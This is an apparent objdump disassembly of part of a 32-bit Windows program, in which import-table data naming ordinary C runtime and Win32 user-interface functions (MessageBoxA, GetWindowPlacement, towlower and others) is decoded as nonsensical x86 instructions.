  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
